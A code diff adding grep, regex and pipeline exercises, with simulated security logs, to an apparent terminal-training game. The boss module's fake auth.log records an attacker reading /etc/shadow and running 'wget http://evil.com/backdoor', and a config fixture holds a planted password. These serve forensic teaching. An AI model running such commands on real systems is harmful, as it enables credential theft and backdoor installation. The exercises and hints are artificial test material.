@@ -8409,6 +8409,575 @@ backup:x:998:998:Backup Service:/var/backups:/usr/sbin/nologin
             remoteHosts: null,
         },
 
+        // ══════════════════════════════════════════════════════════════════════════
+        // GREP & PIPE MASTERY - SPECIAL OPERATIONS COURSE
+        // These modules are standalone (not part of CLH tier progression)
+        // ══════════════════════════════════════════════════════════════════════════
+
+        // ──────────────────────────────────────────────────────────
+        // GPM-001: Grep Fundamentals
+        // Theme: Pattern hunting with grep flags
+        // ──────────────────────────────────────────────────────────
+        'GPM-001': {
+            title: 'Grep Fundamentals',
+            description: 'Master grep flags for security log analysis. Hunt patterns like a pro.',
+            prerequisites: [],
+            tier: null, // Special course - not in tier progression
+            user: 'analyst',
+            hostname: 'logserver',
+            startDir: '/var/log',
+            allowedCommands: null,
+
+            filesystem: {
+                '/var/log': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root',
+                    children: ['auth.log', 'syslog', 'access.log', 'error.log', 'secure.log', 'configs']
+                },
+                '/var/log/auth.log': {
+                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'adm', size: 2048,
+                    content: `Jan 15 02:14:33 server sshd[1234]: Failed password for root from 192.168.1.105 port 44521 ssh2
+Jan 15 02:14:35 server sshd[1234]: Failed password for root from 192.168.1.105 port 44522 ssh2
+Jan 15 02:14:38 server sshd[1234]: Failed password for admin from 192.168.1.105 port 44523 ssh2
+Jan 15 02:15:01 server sshd[1235]: Accepted password for admin from 10.0.0.5 port 55123 ssh2
+Jan 15 02:15:22 server sshd[1236]: Failed password for root from 192.168.1.105 port 44524 ssh2
+Jan 15 02:15:45 server sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/bash
+Jan 15 02:16:01 server sshd[1237]: Failed password for root from 192.168.1.105 port 44525 ssh2
+Jan 15 02:16:33 server sshd[1238]: Failed password for administrator from 192.168.1.105 port 44526 ssh2
+Jan 15 03:00:00 server CRON[2001]: (root) CMD (/usr/bin/backup.sh)
+Jan 15 03:14:22 server sshd[1239]: Failed password for root from 192.168.1.105 port 44601 ssh2`
+                },
+                '/var/log/syslog': {
+                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'adm', size: 1536,
+                    content: `Jan 15 02:00:00 server kernel: Linux version 5.15.0
+Jan 15 02:14:30 server sshd[1234]: error: PAM: Authentication failure for root
+Jan 15 02:14:33 server sshd[1234]: error: maximum authentication attempts exceeded
+Jan 15 02:15:00 server kernel: WARNING: possible SYN flood attack
+Jan 15 02:15:45 server sudo[1500]: admin : command not allowed
+Jan 15 02:16:00 server kernel: ERROR: disk space critical on /var
+Jan 15 03:00:00 server backup: INFO: backup started
+Jan 15 03:05:00 server backup: INFO: backup completed successfully`
+                },
+                '/var/log/access.log': {
+                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'adm', size: 1024,
+                    content: `192.168.1.105 - - [15/Jan:02:14:30] "GET /admin HTTP/1.1" 401
+192.168.1.105 - - [15/Jan:02:14:35] "POST /login HTTP/1.1" 401
+10.0.0.5 - - [15/Jan:02:15:01] "GET /dashboard HTTP/1.1" 200
+192.168.1.105 - - [15/Jan:02:16:00] "GET /admin HTTP/1.1" 403
+172.16.0.50 - - [15/Jan:02:20:00] "GET /index.html HTTP/1.1" 200
+192.168.1.105 - - [15/Jan:02:25:00] "GET /wp-admin HTTP/1.1" 404`
+                },
+                '/var/log/error.log': {
+                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'adm', size: 768,
+                    content: `[ERROR] 02:14:33 Authentication failed for user root
+[ERROR] 02:14:35 Authentication failed for user root
+[WARNING] 02:15:00 Multiple failed login attempts detected
+[CRITICAL] 02:16:00 Disk space below threshold
+[ERROR] 02:16:33 Authentication failed for user administrator
+[INFO] 03:00:00 Scheduled backup initiated`
+                },
+                '/var/log/secure.log': {
+                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'adm', size: 512,
+                    content: `Jan 15 02:14:33 sshd: pam_unix(sshd:auth): authentication failure; user=root rhost=192.168.1.105
+Jan 15 02:15:01 sshd: pam_unix(sshd:session): session opened for user admin
+Jan 15 02:15:45 sudo: admin : user NOT in sudoers
+Jan 15 02:16:01 sshd: pam_unix(sshd:auth): authentication failure; user=root rhost=192.168.1.105`
+                },
+                '/var/log/configs': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root',
+                    children: ['ssh.conf', 'apache.conf', 'mysql.conf']
+                },
+                '/var/log/configs/ssh.conf': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root', size: 256,
+                    content: `# SSH Configuration
+Port 22
+PermitRootLogin no
+PasswordAuthentication yes
+MaxAuthTries 6`
+                },
+                '/var/log/configs/apache.conf': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root', size: 256,
+                    content: `# Apache Configuration
+ServerRoot "/etc/apache2"
+Listen 80
+# password: admin123 (REMOVE BEFORE PRODUCTION)`
+                },
+                '/var/log/configs/mysql.conf': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root', size: 128,
+                    content: `[mysqld]
+datadir=/var/lib/mysql
+socket=/var/lib/mysql/mysql.sock`
+                }
+            },
+
+            objectives: [
+                {
+                    id: 1,
+                    task: 'Find "error" entries (case-insensitive)',
+                    hint: 'Use -i flag: grep -i "error" filename',
+                    check: (cmd, state, output) => {
+                        return cmd.includes('grep') && cmd.includes('-i') &&
+                               (cmd.toLowerCase().includes('error') || output);
+                    }
+                },
+                {
+                    id: 2,
+                    task: 'Count failed login attempts',
+                    hint: 'Use -c flag: grep -c "failed" auth.log',
+                    check: (cmd, state, output) => {
+                        return cmd.includes('grep') && cmd.includes('-c') &&
+                               cmd.toLowerCase().includes('failed');
+                    }
+                },
+                {
+                    id: 3,
+                    task: 'Show "root" matches with line numbers',
+                    hint: 'Use -n flag: grep -n "root" filename',
+                    check: (cmd, state, output) => {
+                        return cmd.includes('grep') && cmd.includes('-n') &&
+                               cmd.includes('root');
+                    }
+                },
+                {
+                    id: 4,
+                    task: 'Find lines NOT containing "failed" (successful)',
+                    hint: 'Use -v flag to invert match: grep -v "failed" auth.log',
+                    check: (cmd, state, output) => {
+                        return cmd.includes('grep') && cmd.includes('-v');
+                    }
+                },
+                {
+                    id: 5,
+                    task: 'Search recursively for "password"',
+                    hint: 'Use -r flag: grep -r "password" /var/log/',
+                    check: (cmd, state, output) => {
+                        return cmd.includes('grep') && cmd.includes('-r') &&
+                               cmd.toLowerCase().includes('password');
+                    }
+                },
+                {
+                    id: 6,
+                    task: 'Get context around a critical event',
+                    hint: 'Use -A, -B, or -C flags: grep -C 2 "CRITICAL" error.log',
+                    check: (cmd, state, output) => {
+                        const lowerCmd = cmd.toLowerCase();
+                        return cmd.includes('grep') && /-[abc]\s*\d/.test(lowerCmd);
+                    }
+                },
+                {
+                    id: 7,
+                    task: 'List files containing "ssh"',
+                    hint: 'Use -l flag: grep -rl "ssh" /var/log/',
+                    check: (cmd, state, output) => {
+                        return cmd.includes('grep') && cmd.includes('-l');
+                    }
+                },
+                {
+                    id: 8,
+                    task: 'Match whole word "admin" only',
+                    hint: 'Use -w flag: grep -w "admin" auth.log',
+                    check: (cmd, state, output) => {
+                        return cmd.includes('grep') && cmd.includes('-w') &&
+                               cmd.includes('admin');
+                    }
+                }
+            ]
+        },
+
+        // ──────────────────────────────────────────────────────────
+        // GPM-002: Regex Power
+        // Theme: Regular expressions for pattern matching
+        // ──────────────────────────────────────────────────────────
+        'GPM-002': {
+            title: 'Regex Power',
+            description: 'Unlock pattern-matching superpowers with regular expressions.',
+            prerequisites: ['GPM-001'],
+            tier: null,
+            user: 'analyst',
+            hostname: 'intelserver',
+            startDir: '/data/intel',
+            allowedCommands: null,
+
+            filesystem: {
+                '/data/intel': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'analyst', group: 'analyst',
+                    children: ['network.log', 'users.txt', 'connections.log', 'alerts.log']
+                },
+                '/data/intel/network.log': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 1024,
+                    content: `2024-01-15 02:14:33 TCP 192.168.1.105:44521 -> 10.0.0.5:22 SYN
+2024-01-15 02:14:35 TCP 192.168.1.105:44522 -> 10.0.0.5:22 SYN
+2024-01-15 02:15:01 TCP 10.0.0.88:55123 -> 10.0.0.5:22 ESTABLISHED
+2024-01-15 02:15:22 TCP 192.168.1.105:44523 -> 10.0.0.5:22 RST
+2024-01-15 02:16:00 UDP 8.8.8.8:53 -> 10.0.0.5:44444 DNS
+2024-01-15 02:16:33 TCP 192.168.1.105:44524 -> 10.0.0.5:22 SYN`
+                },
+                '/data/intel/users.txt': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 768,
+                    content: `admin:x:1000:1000:Admin User:/home/admin:/bin/bash
+root:x:0:0:root:/root:/bin/bash
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+user1@company.com:active:developer
+user2@company.com:active:analyst
+admin@evil.com:suspicious:unknown
+test@test.org:inactive:tester`
+                },
+                '/data/intel/connections.log': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 512,
+                    content: `ESTABLISHED 192.168.1.105:44521 10.0.0.5:22 ssh denied
+ESTABLISHED 192.168.1.105:44522 10.0.0.5:22 ssh denied
+ESTABLISHED 10.0.0.88:55123 10.0.0.5:22 ssh authorized
+CLOSED 192.168.1.105:44523 10.0.0.5:22 ssh denied
+TIME_WAIT 172.16.0.50:8080 10.0.0.5:80 http authorized
+ESTABLISHED 192.168.1.105:44524 10.0.0.5:22 ssh denied`
+                },
+                '/data/intel/alerts.log': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 640,
+                    content: `2024-01-15 02:14:33 ALERT: Unauthorized access attempt from 192.168.1.105
+2024-01-15 02:15:00 WARNING: Multiple failed authentications
+2024-01-15 02:15:22 ALERT: Brute force pattern detected
+2024-01-15 02:16:00 ERROR: Connection rate limit exceeded
+2024-01-15 02:16:33 CRITICAL: Security breach suspected
+fff failed failed failed
+aaa unauthorized unauthorized unauthorized unauthorized`
+                }
+            },
+
+            objectives: [
+                {
+                    id: 1,
+                    task: 'Find lines starting with a date (2024)',
+                    hint: 'Use ^ anchor: grep "^2024" filename',
+                    check: (cmd, state, output) => {
+                        return cmd.includes('grep') && cmd.includes('^');
+                    }
+                },
+                {
+                    id: 2,
+                    task: 'Extract all IP addresses',
+                    hint: 'Use -Eo with digit pattern: grep -Eo "[0-9]+\\.[0-9]+" network.log',
+                    check: (cmd, state, output) => {
+                        const lowerCmd = cmd.toLowerCase();
+                        return cmd.includes('grep') && lowerCmd.includes('-o') &&
+                               (lowerCmd.includes('-e') || lowerCmd.includes('[0-9]'));
+                    }
+                },
+                {
+                    id: 3,
+                    task: 'Find error OR warning messages',
+                    hint: 'Use | operator with -E: grep -E "error|warning" alerts.log',
+                    check: (cmd, state, output) => {
+                        return cmd.includes('grep') && cmd.includes('|') &&
+                               (cmd.includes('-E') || cmd.includes('-e'));
+                    }
+                },
+                {
+                    id: 4,
+                    task: 'Match port numbers (:[0-9]+)',
+                    hint: 'Use digit range: grep -E ":[0-9]+" network.log',
+                    check: (cmd, state, output) => {
+                        return cmd.includes('grep') && cmd.includes(':[0-9]');
+                    }
+                },
+                {
+                    id: 5,
+                    task: 'Find lines ending with "denied"',
+                    hint: 'Use $ anchor: grep "denied$" connections.log',
+                    check: (cmd, state, output) => {
+                        return cmd.includes('grep') && cmd.includes('$');
+                    }
+                },
+                {
+                    id: 6,
+                    task: 'Extract email addresses',
+                    hint: 'Look for @ symbol pattern: grep -E "[^@]+@[^@]+" users.txt',
+                    check: (cmd, state, output) => {
+                        return cmd.includes('grep') && cmd.includes('@');
+                    }
+                },
+                {
+                    id: 7,
+                    task: 'Find 3+ repeated words (e.g., failed)',
+                    hint: 'Use {n,} quantifier: grep -E "(failed ){3,}" alerts.log',
+                    check: (cmd, state, output) => {
+                        return cmd.includes('grep') && cmd.includes('{');
+                    }
+                },
+                {
+                    id: 8,
+                    task: 'Match optional pattern (un)?authorized',
+                    hint: 'Use ? quantifier: grep -E "(un)?authorized" connections.log',
+                    check: (cmd, state, output) => {
+                        return cmd.includes('grep') && cmd.includes('?');
+                    }
+                }
+            ]
+        },
+
+        // ──────────────────────────────────────────────────────────
+        // GPM-003: Pipe Wizardry
+        // Theme: Unix pipes and data transformation
+        // ──────────────────────────────────────────────────────────
+        'GPM-003': {
+            title: 'Pipe Wizardry',
+            description: 'Chain commands together with pipes to transform and analyze data.',
+            prerequisites: ['GPM-002'],
+            tier: null,
+            user: 'analyst',
+            hostname: 'forensics',
+            startDir: '/forensics',
+            allowedCommands: null,
+
+            filesystem: {
+                '/forensics': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'analyst', group: 'analyst',
+                    children: ['access.log', 'auth.log', 'connections.log', 'ips.txt', 'reports']
+                },
+                '/forensics/access.log': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 2048,
+                    content: `192.168.1.105 GET /admin 401
+192.168.1.105 POST /login 401
+192.168.1.105 GET /admin 401
+10.0.0.5 GET /dashboard 200
+192.168.1.105 GET /admin 403
+172.16.0.50 GET /index.html 200
+192.168.1.105 GET /wp-admin 404
+192.168.1.105 GET /admin 401
+10.0.0.5 GET /api/users 200
+192.168.1.105 POST /login 401
+172.16.0.50 GET /about 200
+192.168.1.105 GET /admin 401`
+                },
+                '/forensics/auth.log': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 1536,
+                    content: `Jan 15 02:14:33 Failed password for root from 192.168.1.105
+Jan 15 02:14:35 Failed password for root from 192.168.1.105
+Jan 15 02:14:38 Failed password for admin from 192.168.1.105
+Jan 15 02:15:01 Accepted password for admin from 10.0.0.5
+Jan 15 02:15:22 Failed password for root from 192.168.1.105
+Jan 15 02:16:01 Failed password for root from 192.168.1.105
+Jan 15 02:16:33 Failed password for administrator from 192.168.1.105
+Jan 15 03:14:22 Failed password for root from 192.168.1.105`
+                },
+                '/forensics/connections.log': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 768,
+                    content: `192.168.1.105:22 DENIED
+192.168.1.105:22 DENIED
+10.0.0.5:22 ALLOWED
+192.168.1.105:22 DENIED
+172.16.0.50:80 ALLOWED
+192.168.1.105:22 DENIED
+192.168.1.105:22 DENIED
+10.0.0.88:22 ALLOWED`
+                },
+                '/forensics/ips.txt': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 256,
+                    content: `192.168.1.105
+192.168.1.105
+10.0.0.5
+192.168.1.105
+172.16.0.50
+192.168.1.105
+10.0.0.5
+192.168.1.105`
+                },
+                '/forensics/reports': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'analyst', group: 'analyst',
+                    children: []
+                }
+            },
+
+            objectives: [
+                {
+                    id: 1,
+                    task: 'Count lines in grep output',
+                    hint: 'Pipe to wc -l: grep "pattern" file | wc -l',
+                    check: (cmd, state, output) => {
+                        return cmd.includes('|') && cmd.includes('wc -l');
+                    }
+                },
+                {
+                    id: 2,
+                    task: 'Sort grep results alphabetically',
+                    hint: 'Pipe to sort: grep "pattern" file | sort',
+                    check: (cmd, state, output) => {
+                        return cmd.includes('|') && cmd.includes('sort');
+                    }
+                },
+                {
+                    id: 3,
+                    task: 'Get unique values from data',
+                    hint: 'Pipe through sort then uniq: cat file | sort | uniq',
+                    check: (cmd, state, output) => {
+                        return cmd.includes('|') && cmd.includes('uniq');
+                    }
+                },
+                {
+                    id: 4,
+                    task: 'Count occurrences of each unique value',
+                    hint: 'Use uniq -c: sort file | uniq -c',
+                    check: (cmd, state, output) => {
+                        return cmd.includes('|') && cmd.includes('uniq -c');
+                    }
+                },
+                {
+                    id: 5,
+                    task: 'Find top 5 most frequent items',
+                    hint: 'Chain: sort | uniq -c | sort -rn | head -5',
+                    check: (cmd, state, output) => {
+                        return (cmd.includes('sort -rn') || cmd.includes('sort -nr')) &&
+                               cmd.includes('head');
+                    }
+                },
+                {
+                    id: 6,
+                    task: 'Extract a specific field with cut',
+                    hint: 'Use cut -d to split: cut -d" " -f1 file',
+                    check: (cmd, state, output) => {
+                        return cmd.includes('cut -d');
+                    }
+                },
+                {
+                    id: 7,
+                    task: 'Build a 3+ stage pipeline',
+                    hint: 'Chain multiple commands: cmd1 | cmd2 | cmd3',
+                    check: (cmd, state, output) => {
+                        const pipeCount = (cmd.match(/\|/g) || []).length;
+                        return pipeCount >= 2;
+                    }
+                },
+                {
+                    id: 8,
+                    task: 'Use tee to save AND display output',
+                    hint: 'Use tee: grep "pattern" file | tee output.txt',
+                    check: (cmd, state, output) => {
+                        return cmd.includes('tee');
+                    }
+                }
+            ]
+        },
+
+        // ──────────────────────────────────────────────────────────
+        // GPM-BOSS: Incident Analysis
+        // Theme: Boss challenge combining all skills
+        // ──────────────────────────────────────────────────────────
+        'GPM-BOSS': {
+            title: 'INCIDENT ANALYSIS',
+            description: 'Final challenge: Full incident analysis of a security breach using all techniques.',
+            prerequisites: ['GPM-003'],
+            tier: null,
+            user: 'ir-analyst',
+            hostname: 'evidence',
+            startDir: '/evidence',
+            allowedCommands: null,
+
+            filesystem: {
+                '/evidence': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'ir-analyst', group: 'ir-analyst',
+                    children: ['auth.log', 'access.log', 'reports']
+                },
+                '/evidence/auth.log': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'ir-analyst', group: 'ir-analyst', size: 4096,
+                    content: `Jan 15 02:00:00 server sshd[1000]: Server listening on port 22
+Jan 15 02:14:33 server sshd[1234]: Failed password for root from 192.168.1.105 port 44521 ssh2
+Jan 15 02:14:35 server sshd[1234]: Failed password for root from 192.168.1.105 port 44522 ssh2
+Jan 15 02:14:38 server sshd[1234]: Failed password for root from 192.168.1.105 port 44523 ssh2
+Jan 15 02:14:40 server sshd[1234]: Failed password for root from 192.168.1.105 port 44524 ssh2
+Jan 15 02:14:43 server sshd[1234]: Failed password for root from 192.168.1.105 port 44525 ssh2
+Jan 15 02:15:01 server sshd[1235]: Accepted password for admin from 10.0.0.5 port 55123 ssh2
+Jan 15 02:15:22 server sshd[1236]: Failed password for root from 192.168.1.105 port 44526 ssh2
+Jan 15 02:15:45 server sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/bash
+Jan 15 02:16:01 server sshd[1237]: Failed password for root from 192.168.1.105 port 44527 ssh2
+Jan 15 02:16:33 server sshd[1238]: Failed password for root from 192.168.1.105 port 44528 ssh2
+Jan 15 02:17:00 server sshd[1239]: Failed password for root from 192.168.1.105 port 44529 ssh2
+Jan 15 02:17:15 server sshd[1240]: Failed password for root from 192.168.1.105 port 44530 ssh2
+Jan 15 02:17:30 server sshd[1241]: Failed password for root from 192.168.1.105 port 44531 ssh2
+Jan 15 02:18:00 server sshd[1242]: Failed password for root from 192.168.1.105 port 44532 ssh2
+Jan 15 02:30:00 server sshd[1243]: Accepted password for root from 192.168.1.105 port 44600 ssh2
+Jan 15 02:30:15 server sudo: root : TTY=pts/1 ; COMMAND=/bin/cat /etc/shadow
+Jan 15 02:31:00 server sudo: root : TTY=pts/1 ; COMMAND=/usr/bin/wget http://evil.com/backdoor
+Jan 15 03:00:00 server CRON[2001]: (root) CMD (/usr/bin/backup.sh)
+Jan 15 03:14:22 server sshd[2100]: Session closed for user root`
+                },
+                '/evidence/access.log': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'ir-analyst', group: 'ir-analyst', size: 2048,
+                    content: `192.168.1.105 - - [15/Jan:02:14:30] "GET /admin HTTP/1.1" 401
+192.168.1.105 - - [15/Jan:02:14:33] "POST /login HTTP/1.1" 401
+192.168.1.105 - - [15/Jan:02:14:35] "POST /login HTTP/1.1" 401
+192.168.1.105 - - [15/Jan:02:14:38] "POST /login HTTP/1.1" 401
+10.0.0.5 - - [15/Jan:02:15:01] "GET /dashboard HTTP/1.1" 200
+192.168.1.105 - - [15/Jan:02:15:22] "POST /login HTTP/1.1" 401
+192.168.1.105 - - [15/Jan:02:16:00] "GET /admin HTTP/1.1" 403
+192.168.1.105 - - [15/Jan:02:30:00] "GET /admin HTTP/1.1" 200
+192.168.1.105 - - [15/Jan:02:30:30] "GET /api/users HTTP/1.1" 200
+192.168.1.105 - - [15/Jan:02:31:00] "POST /api/exfil HTTP/1.1" 200`
+                },
+                '/evidence/reports': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'ir-analyst', group: 'ir-analyst',
+                    children: []
+                }
+            },
+
+            objectives: [
+                {
+                    id: 1,
+                    task: 'Find the attacker IP (most failed logins)',
+                    hint: 'Pipeline: grep failed | sort | uniq -c | sort -rn',
+                    check: (cmd, state, output) => {
+                        return cmd.includes('uniq -c') && cmd.includes('sort') &&
+                               cmd.toLowerCase().includes('failed');
+                    }
+                },
+                {
+                    id: 2,
+                    task: 'Count total failed attack attempts',
+                    hint: 'Use grep -c: grep -c "Failed" auth.log',
+                    check: (cmd, state, output) => {
+                        return cmd.includes('grep') && cmd.includes('-c') &&
+                               cmd.toLowerCase().includes('failed');
+                    }
+                },
+                {
+                    id: 3,
+                    task: 'Find what user account was targeted',
+                    hint: 'Search for "root" in the logs',
+                    check: (cmd, state, output) => {
+                        return cmd.includes('grep') && cmd.includes('root');
+                    }
+                },
+                {
+                    id: 4,
+                    task: 'Check if any login succeeded for attacker',
+                    hint: 'Search for "Accepted" in auth.log',
+                    check: (cmd, state, output) => {
+                        return cmd.includes('grep') &&
+                               (cmd.toLowerCase().includes('accepted') || cmd.toLowerCase().includes('success'));
+                    }
+                },
+                {
+                    id: 5,
+                    task: 'Extract the attack timeline (02:XX timestamps)',
+                    hint: 'grep for the attack timeframe: grep "02:" auth.log',
+                    check: (cmd, state, output) => {
+                        return cmd.includes('grep') &&
+                               (cmd.includes('02:') || cmd.includes('03:'));
+                    }
+                },
+                {
+                    id: 6,
+                    task: 'Generate a summary report (save to file)',
+                    hint: 'Use redirection > or tee: ... > report.txt',
+                    check: (cmd, state, output) => {
+                        return cmd.includes('>') || cmd.includes('tee');
+                    }
+                }
+            ],
+
+            insightPhase: {
+                enabled: false
+            }
+        },
+
     };
 
     // ═══════════════════════════════════════════════════════════════
